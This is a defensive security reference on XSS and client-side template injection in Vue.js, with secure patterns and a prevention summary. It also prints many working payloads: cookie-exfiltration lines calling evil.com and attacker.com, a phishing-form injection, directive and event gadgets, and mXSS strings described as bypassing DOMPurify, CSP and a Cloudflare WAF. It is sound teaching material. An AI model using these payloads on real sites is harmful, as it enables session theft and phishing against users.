# A03 — Injection & XSS in Vue.js

## Overview

Vue.js auto-escapes `{{ }}` interpolation, making basic XSS harder. However, Vue introduces unique attack surfaces: `v-html`, client-side template injection (CSTI), directive-based script gadgets, Vue-specific event handlers that bypass CSP, and mutation XSS (mXSS) that bypasses HTML sanitizers. These vectors come directly from PortSwigger's XSS cheat sheet and research.

Severity: **Critical**

---

## 1. v-html — The #1 Vue XSS Mistake

### Vulnerable Pattern
```vue
<template>
  <!-- ❌ User-supplied HTML rendered raw -->
  <div v-html="comment.body"></div>

  <!-- ❌ Dynamic href with javascript: protocol -->
  <a :href="userUrl">Click me</a>

  <!-- ❌ Dynamic component from user input -->
  <component :is="userControlledTag" />
</template>
```

### Exploit Payloads (via v-html)
```html
<!-- Image error — no user interaction needed -->
<img src=x onerror="fetch('https://evil.com?c='+document.cookie)">

<!-- SVG load — fires immediately -->
<svg onload="document.location='https://evil.com?c='+document.cookie">

<!-- CSS animation event — bypasses WAF denylists for onerror/onclick -->
<style>@keyframes x{}</style>
<div style="animation-name:x" onanimationstart="alert(1)"></div>

<!-- iframe phishing overlay -->
<iframe src="https://evil.com/phishing" style="position:fixed;
  top:0;left:0;width:100%;height:100%;z-index:9999;border:0"></iframe>
```

### Secure Pattern
```vue
<script setup>
import DOMPurify from 'dompurify'
import { computed } from 'vue'

const safeHtml = computed(() =>
  DOMPurify.sanitize(props.userContent, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
    ALLOWED_ATTR: ['href'],
    ALLOW_DATA_ATTR: false,
  })
)
</script>
<template>
  <!-- ✅ Auto-escaped — safe by default -->
  <p>{{ comment.body }}</p>

  <!-- ✅ If rich text needed, sanitize first -->
  <div v-html="safeHtml"></div>
</template>
```

### Use Case
A learning platform has a "Notes" feature where students post formatted notes. A malicious student submits a note containing an img tag with an onerror handler via v-html. When another student views it, their session cookie is exfiltrated.

---

## 2. Client-Side Template Injection (CSTI)

When user input lands inside a Vue template (e.g., reflected in server-rendered HTML within Vue's mount point), attackers execute JavaScript via `{{ }}` expressions. Vue compiles templates using `new Function(code)` internally.

### How It Happens
```html
<!-- Server renders user input inside #app -->
<div id="app">
  Welcome, <?= $_GET['name'] ?> <!-- server-side inject -->
</div>
<script>
  Vue.createApp({}).mount('#app')
</script>
<!-- Attacker sets name to: {{_c.constructor('alert(1)')()}} -->
<!-- Vue compiles and EXECUTES it as a JavaScript expression -->
```

### PortSwigger Expression Vectors

| Payload | Vue Version | Notes |
|---------|------------|-------|
| `{{constructor.constructor('alert(1)')()}}` | V2+V3 | Classic — works in any scope |
| `{{_c.constructor('alert(1)')()}}` | V2 | Shorter — uses internal _c function |
| `{{_b.constructor\`alert(1)\`()}}` | V2 | Tagged template literal — 30 bytes |
| `{{_openBlock.constructor('alert(1)')()}}` | V3 | V3 equivalent — verbose function names |
| `{{_Vue.h.constructor\`alert(1)\`()}}` | V3 | Shortest V3 vector via _Vue.h |
| `{{_createBlock.constructor('alert(1)')()}}` | V3 | Alternative V3 internal function |
| `{{_toDisplayString.constructor('alert(1)')()}}` | V3 | Another V3 function in scope |

### Real-World Exploitation
```
// Cookie exfiltration via CSTI (from bug bounty writeup)
{{$emit.constructor`fetch('https://attacker.com',{method:'POST',
mode:'no-cors',body:document.cookie})`()}}

// UI redressing — replace page with phishing login form
{{_c.constructor('document.body.innerHTML=`<form action=
https://evil.com/steal><input name=user placeholder=Email>
<input name=pass type=password><button>Login</button></form>`')()}}
```

### Prevention
Never reflect user input into Vue's mount point. Pass user data via data-attributes:
```html
<!-- ❌ WRONG -->
<div id="app">Welcome, <%= user.name %></div>

<!-- ✅ RIGHT -->
<div id="app" :data-username="serverEscaped(user.name)"></div>
<script setup>
const username = document.getElementById('app').dataset.username
</script>
```

---

## 3. Directive-Based Script Gadgets

Nearly every Vue directive evaluates its expression — making each one a potential injection vector if user input reaches the attribute.

### PortSwigger Directive Vectors

| Vector | Directive | Notes |
|--------|-----------|-------|
| `<x v-html=_c.constructor('alert(1)')()>` | v-html | Original @garethheyes — shortest V2 tag-based |
| `<p v-show="_c.constructor\`alert(1)\`()">` | v-show | Condition evaluated = code execution |
| `<x v-bind:a='_b.constructor\`alert(1)\`()'>` | v-bind | Any v-bind evaluates expression |
| `<x v-if=_c.constructor('alert(1)')()>` | v-if | Community contribution by @p4fg |
| `<p :=_c.constructor\`alert(1)\`()>` | v-bind shorthand | 32 bytes — shorthand bind |
| `<p v-=_c.constructor\`alert(1)\`()>` | empty directive | 33 bytes — parser quirk |
| `<x #[_c.constructor\`alert(1)\`()]>` | v-slot shorthand | 33 bytes — slot shorthand |

### Dynamic Components — Shortest Vector (23 chars)
```html
<!-- PortSwigger — shortest Vue2 XSS: 23 chars, 27 bytes -->
<x is=script src=//⑭.₨>

<!-- Vue's "is" attribute turns <x> into <script> -->
<!-- Unicode domain ⑭.₨ resolves to 14.rs (attacker-controlled) -->
```

### slot-scope Injection
```html
<!-- Injects into non-template-expression attribute -->
<p slot-scope="){}}])+this.constructor.constructor('alert(1)')()})};//">

<!-- If WAF blocks "this", use local scope function: -->
<p slot-scope="){}}])+_c.constructor.constructor('alert(origin)')()})};//">
```

---

## 4. Vue Event-Based Gadgets

Vue's `@` shorthand (alias for `v-on`) creates event handlers processed by Vue's compiler — not native DOM events. They bypass CSP policies and WAF denylists.

### PortSwigger Event Vectors

| Vector | Bytes | Notes |
|--------|-------|-------|
| `<svg @load=this.alert(1)>` | 26 | No interaction — this→window in non-strict |
| `<svg@load=this.alert(1)>` | 25 | No space needed — Vue parser quirk |
| `<img src @error="$event.composedPath().pop().alert(1)">` | — | Cross-browser — composedPath() reaches window |
| `<x @click=$event.view.alert(1)>click</x>` | — | V3 — $event.view reaches window |
| `<x @click=_withCtx.constructor\`alert(1)\`()>click</x>` | — | V3 event handler exposes _withCtx |

### Why this→window Works
Vue compiles expressions WITHOUT strict mode. Inside a function call, `this` refers to the global `window` object:
```
{{-function(){this.alert(1)}()}}
```

### CSP Bypass Implication
Native DOM events like `onerror` are blocked by `script-src 'self'` CSP. But Vue's `@error` handlers are compiled into JavaScript by Vue's runtime — they execute under Vue's existing trusted script, bypassing CSP entirely.

---

## 5. Mutation XSS (mXSS)

Vue's template parser mutates safe HTML into dangerous HTML — reflected input that passes through an HTML sanitizer can become executable after Vue processes it.

### Attribute-Based Mutation
```
Input (passes HTML filters):
<x title"="&lt;iframe&Tab;onload&Tab;=alert(1)&gt;">

After Vue mutation (iframe is live):
"="<iframe onload="alert(1)">"></iframe>
```

### Tag-Nesting Mutation
```
Input:
<xyz<img/src onerror=alert(1)>>

After Vue mutation:
<img src="" onerror="alert(1)">>
```

### SVG + Noscript mXSS (Bypasses WAF + DOMPurify)
```
Input (passes HTML sanitizers):
<svg><svg><b><noscript>&lt;/noscript&gt;
&lt;iframe&Tab;onload=alert(1)&gt;</noscript></b></svg>

After Vue mutation (iframe is live):
<svg><svg></svg></svg><b><noscript></noscript>
<iframe onload="alert(1)"></iframe></b>
```

### mXSS + CSP Bypass Combo
```
<svg><svg><b><noscript>&lt;/noscript&gt;
&lt;img/src/&Tab;@error=$event.path.pop().alert(1)&gt;
</noscript></b></svg>
<!-- Bypasses BOTH the HTML filter AND CSP -->
```

### Cloudflare WAF Bypass
```
<x title"="&lt;iframe&Tab;onload&Tab;=setTimeout(/alert(1)/.source)&gt;">
```

---

## 6. Vue 3 Adaptations

V3 broke V2 vectors by removing short function names (`_c`, `_b`), but PortSwigger found equivalents.

### V2 → V3 Migration

| Vue 2 | Vue 3 Equivalent | Change |
|-------|-------------------|--------|
| `{{_c.constructor('alert(1)')()}}` | `{{_openBlock.constructor('alert(1)')()}}` | _c removed |
| `{{_b.constructor\`alert(1)\`()}}` | `{{_Vue.h.constructor\`alert(1)\`()}}` | _Vue.h is shortest |
| `<x @[_b.constructor\`…\`()]>` | `<x @[_capitalize.constructor\`…\`()]>` | V3 lowercases attrs |
| `<x @click=_b.constructor\`…\`()>` | `<x @click=_withCtx.constructor\`…\`()>` | Event handler scope |

### Vue 3 Teleport Attack
```html
<!-- Teleport injects outside the app mount boundary -->
<teleport to="head">
  <script>alert(1)</script>
</teleport>

<!-- Expressions execute outside #app div -->
<div id="app">#x,.haha</div>
<div class=haha>{{_Vue.h.constructor`alert(1)`()}}</div>
```

Note: Teleport and dynamic component vectors that inject `<script>` nodes are blocked by CSP. Expression and event gadgets bypass CSP because they execute within Vue's trusted script.

---

## 7. Prevention Summary

No single defense stops all Vue XSS vectors. Layer these:

1. **Never use v-html with user input.** Use `{{ }}` (auto-escapes) or DOMPurify with strict ALLOWED_TAGS/ALLOWED_ATTR.
2. **Never reflect user input into Vue templates.** Pass data via props or data-attributes, never inline server-rendered content into Vue's mount point.
3. **Validate dynamic hrefs.** Allowlist protocols (`https:` only), reject `javascript:`.
4. **Allowlist dynamic components.** Map user input to a fixed set of component names.
5. **CSP with Trusted Types.** `require-trusted-types-for 'script'` blocks innerHTML/v-html at the browser level — the strongest defense against Vue gadgets.
6. **CSP alone is insufficient.** Vue's `@event` handlers and template expressions bypass `script-src` CSP because they execute within Vue's already-trusted runtime.
